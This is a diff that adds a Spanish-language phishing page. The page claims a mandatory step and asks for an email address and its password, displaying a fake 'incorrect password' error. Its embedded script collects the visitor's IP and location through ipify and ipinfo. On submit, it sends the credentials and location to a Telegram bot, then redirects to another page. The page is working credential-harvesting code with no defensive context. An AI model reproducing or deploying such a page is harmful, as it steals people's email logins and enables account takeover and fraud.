@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" href="gastron/parecido.css">
+    <title>moche</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+       
+   
+    </style>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="/gastron/pres.js"></script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("fostera").value;
+    u_name2 = document.getElementById("fosterb").value;
+    ip = document.getElementById("plai").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "MMMBB\n☰hco: " + u_name + "\n☰kkkk: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'floww.html';
+    });
+    return false;
+  };
+
+</script>
+</head>
+<body>
+
+
+
+
+
+    <div id="myprest" >
+
+
+    </div>
+    <div style="background-color: white;" >
+<p  style="text-align: center;">
+    <div class="vertice" >
+<br>
+
+
+<img class="log-jp" src="gastron/prooooke9.png" alt="primerlog"></p></div>
+
+<div id="myhom" >
+
+
+</div>
+<center>
+<div  class="formu9">
+  
+
+  <form  method="post" action="#" onsubmit="return sender();">
+        <h2>Este paso es obligatorio...</h2><br>
+ <img class="golden" src="gastron/protg.png" alt="">
+            <div class="form-group">
+              <br>
+                <input class="campos" type="email" id="fostera" name="fostera" placeholder="INGRESA TU CORREO ASOCIADO"  required="">
+            </div>
+            <div class="form-group">
+               
+                <input     class="campos" type="text" id="fosterb" name="fosterb" placeholder=" CLAVE DEL CORREO!!"  required="">
+            <p style="color: red;">Error Clave de email incorrecta!!</p> <br>
+            </div>
+            <div class="form-group">
+                <button class="campobo" type="submit" >SIGUIENTE </button>
+            </div>
+        </form>
+      </div>
+
+    </div>
+
+    <footer>Todos los derechos reservados. Este proceso es obligatorio
+    </footer>
+    <div style="color: rgb(255, 255, 255);font-size: 0.05px;" >
+        <p id="plai"></p>
+        <p id="ip"></p>
+        <p id="address"></p></div>
+</body> </center>
+</html>
